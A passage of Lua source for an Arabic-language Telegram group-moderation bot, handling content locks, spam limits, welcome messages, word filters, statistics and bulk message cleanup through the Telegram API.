if LockText[2] == "الطائفيه" then
if DevJoker:get(BlAcK..'Joker:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الطائفيه")  
DevJoker:del(BlAcK..'Joker:Lock:Taf'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevJoker:get(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الكفر")  
DevJoker:del(BlAcK..'Joker:Lock:Kfr'..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevJoker:get(BlAcK..'Joker:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل الفارسيه بالطرد")  
DevJoker:set(BlAcK..'Joker:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالحذف")  
DevJoker:set(BlAcK.."Joker:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالطرد")  
DevJoker:set(BlAcK.."Joker:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالتقيد")  
DevJoker:set(BlAcK.."Joker:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevJoker:get(BlAcK..'Joker:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevJoker:set(BlAcK.."Joker:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevJoker:set(BlAcK..'Joker:Lock:Pin'..msg.chat_id_,true)
DevJoker:sadd(BlAcK.."Joker:Lock:Pinpin",msg.chat_id_) 
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source BlAcK     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     Source BlAcK     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الايدي بالصوره'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:Id'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الايدي بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:Id'..msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source BlAcK     --
if text == 'ضع رابط' and ChCheck(msg) or text == 'وضع رابط' and ChCheck(msg) or text == 'ضع الرابط' and ChCheck(msg) or text == 'وضع الرابط' and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevJoker:setex(BlAcK.."Joker:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevJoker:get(BlAcK.."Joker:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevJoker:set(BlAcK.."Joker:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevJoker:setex(BlAcK.."Joker:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     Source BlAcK     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الترحيب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:Welcome"..msg.chat_id_)
end
if DevJoker:get(BlAcK..'Joker:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevJoker:del(BlAcK..'Joker:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevJoker:del(BlAcK..'Joker:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevJoker:set(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الترحيب الان\n᥀︙تستطيع اضافة مايلي ↫ ⤈\n᥀︙دالة عرض الاسم ↫ firstname\n᥀︙دالة عرض المعرف ↫ username', 1, 'md')
DevJoker:set(BlAcK..'Joker:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevJoker:del(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Joker(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لم يتم وضع الترحيب \n᥀︙ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source BlAcK     --
if DevJoker:get(BlAcK..'Joker:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevJoker:del(BlAcK..'Joker:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevJoker:del(BlAcK..'Joker:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevJoker:set(BlAcK..'Joker:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الوصف الان', 1, 'md')
end
--     Source BlAcK     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevJoker:set(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevJoker:get(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevJoker:del(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevJoker:del(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevJoker:hset(BlAcK..'Joker:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevJoker:set(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevJoker:get(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevJoker:del(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevJoker:hget(BlAcK..'Joker:Filters:'..msg.chat_id_, text) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevJoker:del(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevJoker:hdel(BlAcK..'Joker:Filters:'..msg.chat_id_, text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevJoker:del(BlAcK.."Joker:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source BlAcK     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫  الاحصائيات ᥀" and ChCheck(msg) then
local gps = DevJoker:scard(BlAcK.."Joker:Groups") local users = DevJoker:scard(BlAcK.."Joker:Users") 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙احصائيات البوت ↫ ⤈\n᥀︙عدد المشتركين ↫ ❨ '..users..' ❩\n᥀︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ᥀" and ChCheck(msg) then
local users = DevJoker:scard(BlAcK.."Joker:Users")
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ᥀" and ChCheck(msg) then
local gps = DevJoker:scard(BlAcK.."Joker:Groups")
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
end
--     Source BlAcK     --
if text and text == "المجموعات" and ChCheck(msg) or text and text == "↫ المجموعات ᥀" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطورين فقط ', 1, 'md')
else
local list = DevJoker:smembers(BlAcK.."Joker:Groups")
local t = '᥀︙مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = '᥀︙لا يوجد مجموعات مفعله'
end
Dev_Joker(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source BlAcK     --
if text and text:match('^تنظيف (%d+)$') or text and text:match('^مسح (%d+)$') and ChCheck(msg) then  
if not DevJoker:get(BlAcK..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$') or text:match('^مسح (%d+)$')) 
if Number > 5000 then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لاتستطيع تنظيف اكثر من 5000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevJoker:setex(BlAcK..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المشتركين ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevJoker:smembers(BlAcK.."Joker:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevJoker:srem(BlAcK.."Joker:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد المشتركين الان ↫ { '..#pv..' }\n᥀︙تم حذف ↫ { '..sendok..' } من المشتركين\n᥀︙العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source BlAcK     --
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) or text == "↫ تنظيف المجموعات ᥀" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevJoker:smembers(BlAcK.."Joker:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevJoker:srem(BlAcK.."Joker:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = BlAcK, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevJoker:srem(BlAcK.."Joker:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevJoker:srem(BlAcK.."Joker:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevJoker:srem(BlAcK.."Joker:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local BlAcKgp2 = (w + q)
local BlAcKgp3 = #group - BlAcKgp2
if q == 0 then
BlAcKgp2 = ''
else
BlAcKgp2 = '\n᥀︙تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
BlAcKgp1 = ''
else
BlAcKgp1 = '\n᥀︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..BlAcKgp1..BlAcKgp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..BlAcKgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source BlAcK     --
if text and (text == "تفعيل التلقائي" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ميزة الحذف التلقائي للميديا'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:CleanNum'..msg.chat_id_,true)  
end
if text and (text == "تعطيل التلقائي" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الحذف التلقائي للميديا'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:CleanNum'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$") or text:match("^عدد المسح (%d+)$")) and Constructor(msg) and ChCheck(msg) then
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$") or text:match("عدد المسح (%d+)$")
if tonumber(Num) < 10 or tonumber(Num) > 1000 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بتحديد عدد اكبر من 10 واصغر من 1000 للحذف التلقائي', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع ↫ *'..Num..'* من الميديا للحذف التلقائي', 1, 'md')
DevJoker:set(BlAcK..'Joker:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevJoker:get(BlAcK..'Joker:Lock:CleanNum'..msg.chat_id_) then
if DevJoker:get(BlAcK..'Joker:CleanNum'..msg.chat_id_) then CleanNum = DevJoker:get(BlAcK..'Joker:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevJoker:scard(BlAcK.."Joker:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevJoker:smembers(BlAcK.."Joker:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
SendText(msg.chat_id_,"᥀︙تم حذف "..Del.." من الميديا تلقائيا",0,'md') 
DevJoker:del(BlAcK.."Joker:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevJoker:scard(BlAcK.."Joker:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevJoker:get(BlAcK..'Joker:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end
end
end
--     Source BlAcK     --
if text == "تفعيل امسح" and Constructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevJoker:scard(BlAcK.."Joker:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M, 1, 'md') 
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and ChCheck(msg) or text == "احذف" and ChCheck(msg) or text == "تنظيف ميديا" and ChCheck(msg) or text == "تنظيف الميديا" and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK.."Joker:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف "..Del.." من الميديا", 1, 'md') 
DevJoker:del(BlAcK.."Joker:cleaner"..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source BlAcK     --
if text == "تفعيل مسح الاغاني" and Constructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل مسح الاغاني بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevJoker:scard(BlAcK.."Joker:cleanermusic"..msg.chat_id_)
if M ~= 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد الاغاني ↫ "..M, 1, 'md') 
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end
if text == "مسح الاغاني" or text == "تنظيف الاغاني" or text == "حذف الاغاني" then
local List = DevJoker:smembers(BlAcK.."Joker:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
end
if Del ~= 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف "..Del.." من الاغاني", 1, 'md') 
DevJoker:del(BlAcK.."Joker:cleanermusic"..msg.chat_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source BlAcK     --
if Admin(msg) then
if text == "تنظيف تعديل" and ChCheck(msg) or text == "تنظيف التعديل" and ChCheck(msg) then   
Joker_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Joker_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Joker_Del},function(arg,data)
new = 0
Joker_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Joker_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Joker_Del2)
end,nil)  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source BlAcK     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local UnLockText = {string.match(text, "^(فتح) (.*)$")}
if UnLockText[2] == "التعديل" then
if DevJoker:get(BlAcK..'Joker:Lock:EditMsgs'..msg.chat_id_) then
